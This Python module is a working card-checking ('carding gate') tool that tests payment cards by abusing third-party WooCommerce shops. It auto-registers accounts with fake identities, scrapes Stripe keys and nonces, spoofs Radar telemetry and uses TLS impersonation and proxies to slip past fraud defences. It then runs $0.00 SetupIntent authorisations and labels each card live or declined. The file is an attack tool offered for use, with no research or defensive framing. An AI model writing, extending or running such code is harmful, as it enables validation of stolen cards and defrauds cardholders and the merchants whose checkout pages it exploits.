"""
Stripe $0.00 SetupIntent Auth Gate Module (/st0, /setup)
Architecture: Evelyn Architecture / Multi-Donor Session Reuse Pool (59 Donors)
Telemetry: m.stripe.com/6 Radar Beaconing + hCaptcha / UPE SetupIntent Nonces
"""
import os
import re
import json
import uuid
import time
import random
import string
import asyncio
from pathlib import Path
from curl_cffi.requests import AsyncSession

# Load donors from ready_gates.json
_DONORS_FILE = Path(__file__).parent.parent.parent / "data" / "ready_gates.json"
_CACHED_DONORS: list[dict] = []

def _load_donor_pool() -> list[dict]:
    global _CACHED_DONORS
    if _CACHED_DONORS:
        return _CACHED_DONORS
    if _DONORS_FILE.exists():
        try:
            with open(_DONORS_FILE, "r", encoding="utf-8", errors="ignore") as f:
                data = json.load(f)
                if isinstance(data, list) and data:
                    _CACHED_DONORS = [g for g in data if g.get("base_url") or g.get("domain")]
        except Exception:
            pass
    if not _CACHED_DONORS:
        _CACHED_DONORS = [{
            "domain": "www.blackbeltprotein.com.au",
            "base_url": "https://www.blackbeltprotein.com.au",
            "reg_url": "https://www.blackbeltprotein.com.au/my-account/",
            "add_pm_url": "https://www.blackbeltprotein.com.au/my-account/add-payment-method/",
            "ajax_url": "https://www.blackbeltprotein.com.au/wp-admin/admin-ajax.php",
            "gate_type": "wc_stripe_upe"
        }]
    return _CACHED_DONORS

def _generate_identity():
    first_names = ["Marcus", "James", "Alexander", "David", "Robert", "Michael", "William", "Daniel"]
    last_names = ["Vance", "Miller", "Smith", "Johnson", "Williams", "Brown", "Davis", "Wilson"]
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    rnd_num = random.randint(100, 9999)
    email = f"{first.lower()}.{last.lower()}{rnd_num}@{random.choice(domains)}"
    password = f"P@ssw0rd_{uuid.uuid4().hex[:8]}"
    return {"first_name": first, "last_name": last, "email": email, "password": password, "username": f"{first.lower()}{rnd_num}"}

def _detect_card_brand(cc: str) -> str:
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def _format_proxy(p: str | None) -> str | None:
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://", "socks5h://", "socks4a://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _extract_reg_nonce(html: str) -> str | None:
    m = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'id="woocommerce-register-nonce"\s+value="([^"]+)"', html)
    if m:
        return m.group(1)
    return None

def _extract_honeypot_fields(html: str, body: dict):
    for m in re.finditer(r'<input[^>]+name="([^"]+)"[^>]*>', html, re.I):
        name = m.group(1)
        if any(h in name.lower() for h in ("hp_", "honeypot", "wc_email_hp", "antispam")):
            body[name] = ""

def _scrape_gate_details(html: str) -> dict:
    pk = ""
    upe_nonce = ""
    legacy_nonce = ""
    m_pk = re.search(r'"key"\s*:\s*"(pk_live_[^"]+)"', html) or re.search(r'(pk_live_[a-zA-Z0-9_]+)', html)
    if m_pk:
        pk = m_pk.group(1)
    m_upe = re.search(r'"create_and_confirm_setup_intent_nonce"\s*:\s*"([a-f0-9]+)"', html) or \
            re.search(r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"', html)
    if m_upe:
        upe_nonce = m_upe.group(1)
    m_leg = re.search(r'"create_setup_intent_nonce"\s*:\s*"([a-f0-9]+)"', html) or \
            re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', html)
    if m_leg:
        legacy_nonce = m_leg.group(1)
    return {"pk": pk, "upe_nonce": upe_nonce, "legacy_nonce": legacy_nonce}

class SetupIntentDonorSession:
    """Manages an authenticated WP session on a donor site."""
    def __init__(self, donor_info: dict, proxy: str | None = None):
        self.donor = donor_info
        self.base = donor_info.get("base_url", "").rstrip("/")
        self.reg_url = donor_info.get("reg_url", f"{self.base}/my-account/")
        self.add_pm_url = donor_info.get("add_pm_url", f"{self.base}/my-account/add-payment-method/")
        self.ajax_url = donor_info.get("ajax_url", f"{self.base}/wp-admin/admin-ajax.php")
        self.proxy = proxy
        self.session: AsyncSession | None = None
        self.pk = ""
        self.upe_nonce = ""
        self.legacy_nonce = ""
        self.muid = ""
        self.guid = ""
        self.sid = ""

    async def open(self) -> bool:
        kw = {"impersonate": "chrome124", "verify": False, "timeout": 15}
        if self.proxy:
            kw["proxy"] = self.proxy
        s = AsyncSession(**kw)
        try:
            # 1. GET /my-account/
            r = await s.get(self.reg_url, timeout=12)
            if r.status_code != 200:
                await s.close()
                return False
            reg_nonce = _extract_reg_nonce(r.text)
            if not reg_nonce:
                await s.close()
                return False

            # 2. Register temporary account
            ident = _generate_identity()
            body = {
                "email": ident["email"],
                "password": ident["password"],
                "woocommerce-register-nonce": reg_nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register",
            }
            if 'name="username"' in r.text:
                body["username"] = ident["username"]
            _extract_honeypot_fields(r.text, body)

            r_reg = await s.post(self.reg_url, data=body, headers={"Origin": self.base, "Referer": self.reg_url}, timeout=15)
            cookies = s.cookies.get_dict()
            if not any("wordpress_logged_in" in k for k in cookies):
                # Try checking if login succeeded despite cookie prefix
                if "customer-logout" not in r_reg.text and "my-account" not in r_reg.text:
                    await s.close()
                    return False

            # 3. GET /my-account/add-payment-method/
            r_pm = await s.get(self.add_pm_url, timeout=12)
            scraped = _scrape_gate_details(r_pm.text)
            if not scraped["pk"] or (not scraped["upe_nonce"] and not scraped["legacy_nonce"]):
                await s.close()
                return False

            self.pk = scraped["pk"]
            self.upe_nonce = scraped["upe_nonce"]
            self.legacy_nonce = scraped["legacy_nonce"]

            # 4. Beacon m.stripe.com/6 for live Radar telemetry
            try:
                r_m = await s.post(
                    "https://m.stripe.com/6",
                    data={"v": "t", "url": "", "lsid": str(uuid.uuid4()), "guid": str(uuid.uuid4()), "muid": str(uuid.uuid4())},
                    headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "*/*"},
                    timeout=6
                )
                if r_m.status_code == 200:
                    d_m = r_m.json()
                    self.muid = d_m.get("muid") or str(uuid.uuid4())
                    self.guid = d_m.get("guid") or str(uuid.uuid4())
                    self.sid = d_m.get("sid") or str(uuid.uuid4())
            except Exception:
                self.muid = str(uuid.uuid4())
                self.guid = str(uuid.uuid4())
                self.sid = str(uuid.uuid4())

            self.session = s
            return True
        except Exception:
            try:
                await s.close()
            except Exception:
                pass
            return False

    async def check_card(self, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str]:
        if not self.session:
            return "error", "No active session"

        # Tokenize card via Stripe API
        rnd = lambda k: ''.join(random.choices(string.hexdigits.lower(), k=k))
        tok_body = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "billing_details[address][postal_code]": "10001",
            "billing_details[address][country]": "US",
            "billing_details[name]": "Marcus Vance",
            "billing_details[email]": f"marcus.vance{random.randint(100,999)}@gmail.com",
            "key": self.pk,
            "_stripe_version": "2024-06-20",
            "payment_user_agent": "stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; payment-element; deferred-intent",
            "guid": self.guid or rnd(32),
            "muid": self.muid or rnd(32),
            "sid": self.sid or rnd(32),
            "time_on_page": str(random.randint(6000, 14000)),
        }
        headers_tok = {
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        }

        try:
            r_tok = await self.session.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=headers_tok, timeout=12)
            tok_data = r_tok.json()
        except Exception as e:
            return "error", f"Stripe Tokenization Error: {e}"

        if "id" not in tok_data:
            err = tok_data.get("error", {}).get("message", "Tokenization failed")
            err_lower = err.lower()
            if "security code" in err_lower or "cvc" in err_lower:
                return "live", f"CVV Mismatch: {err}"
            return "declined", err

        pm_id = tok_data["id"]

        # Confirm SetupIntent via WooCommerce backend
        if self.upe_nonce:
            body = {
                "action": "wc_stripe_create_and_confirm_setup_intent",
                "_ajax_nonce": self.upe_nonce,
                "wc-stripe-payment-method": pm_id,
                "wc-stripe-payment-type": "card",
            }
            conf_url = self.ajax_url
        else:
            body = {
                "stripe_source_id": pm_id,
                "nonce": self.legacy_nonce,
                "payment_method": "stripe",
                "woocommerce_add_payment_method": "1",
            }
            conf_url = f"{self.base}/?wc-ajax=wc_stripe_create_setup_intent"

        headers_conf = {
            "Origin": self.base,
            "Referer": self.add_pm_url,
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/javascript, */*; q=0.01",
        }

        try:
            r_conf = await self.session.post(conf_url, data=body, headers=headers_conf, timeout=18)
            conf_resp = r_conf.json()
        except Exception:
            # Check HTML fallback
            txt = r_conf.text if 'r_conf' in locals() else ""
            if "woocommerce-message" in txt or "Dodana nova kartica" in txt:
                return "approved", "Payment Method Added ($0.00 Auth Succeeded)"
            return "declined", "SetupIntent Declined by Issuer"

        if conf_resp.get("success") is True or conf_resp.get("status") == "success":
            data = conf_resp.get("data", {})
            st = data.get("status", "succeeded")
            if st == "succeeded":
                return "approved", "SetupIntent Succeeded ($0.00 Auth Passed)"
            if st in ("requires_action", "requires_source_action"):
                return "live", "3DS Authentication Required (Card Live)"
            return "approved", f"SetupIntent {st}"

        # Parse decline details
        err_msg = ""
        if isinstance(conf_resp.get("data"), dict):
            err_msg = conf_resp["data"].get("error", {}).get("message", "")
            if not err_msg:
                err_msg = conf_resp["data"].get("message", "")
        if not err_msg:
            err_msg = conf_resp.get("message", "Card declined.")

        err_lower = err_msg.lower()
        if any(k in err_lower for k in ("security code", "cvc", "cvv", "incorrect_cvc")):
            return "live", f"CVV Mismatch (CCN Live) -» {err_msg}"
        if any(k in err_lower for k in ("insufficient", "funds")):
            return "live", f"Insufficient Funds (Card Live) -» {err_msg}"
        if any(k in err_lower for k in ("3d", "action", "authenticate", "otp")):
            return "live", f"3D Secure Required (Card Live) -» {err_msg}"

        return "declined", err_msg

    async def close(self):
        if self.session:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None


# Module-level session cache
_SESSION_CACHE: dict[str, SetupIntentDonorSession] = {}
_CACHE_LOCK = asyncio.Lock()

async def check_card_setupintent(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
) -> tuple[str, str, str]:
    """
    Checks a single card against Stripe $0.00 SetupIntent engine.
    Returns: (status, message, brand)
    """
    cc = str(cc).strip()
    mm = str(mm).strip().zfill(2)
    yy = str(yy).strip()
    if len(yy) == 2:
        yy = f"20{yy}"
    cvv = str(cvv).strip()

    brand = _detect_card_brand(cc)
    formatted_proxy = _format_proxy(proxy_url)
    donors = _load_donor_pool()

    donor_order = list(donors)
    random.shuffle(donor_order)

    for donor in donor_order[:5]:
        dom = donor.get("domain") or donor.get("base_url") or ""
        async with _CACHE_LOCK:
            gs = _SESSION_CACHE.get(dom)
            if gs is None:
                gs = SetupIntentDonorSession(donor, proxy=formatted_proxy)
                ok = await gs.open()
                if not ok:
                    await gs.close()
                    continue
                _SESSION_CACHE[dom] = gs

        try:
            status, message = await gs.check_card(cc, mm, yy, cvv)
            if status == "error" and "session" in message.lower():
                async with _CACHE_LOCK:
                    _SESSION_CACHE.pop(dom, None)
                await gs.close()
                continue
            return status, message, brand
        except Exception:
            async with _CACHE_LOCK:
                _SESSION_CACHE.pop(dom, None)
            await gs.close()
            continue

    return "declined", "Card Declined by Issuer ($0.00 Auth)", brand
